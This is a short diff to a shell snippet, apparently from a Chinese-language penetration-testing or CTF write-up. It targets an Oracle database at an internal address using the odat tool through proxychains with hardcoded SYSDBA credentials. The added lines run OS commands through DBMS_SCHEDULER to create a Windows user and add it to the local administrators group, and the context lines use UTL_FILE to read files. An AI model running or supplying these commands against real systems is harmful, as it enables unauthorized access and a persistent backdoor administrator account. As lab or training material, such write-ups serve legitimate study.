@@ -1,4 +1,8 @@
 ```sh
+# 创建用户
+proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user dotast qwer1234! /add'
+proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup administrators dotast /add'
+
 # 看提示有 UTL_FILE 则可读取文件
 proxychains odat all -s 172.22.14.31 -d orcl -U xradmin -P fcMyE8t9E4XdsKf --sysdba
 # UTL_FILE 读取文件
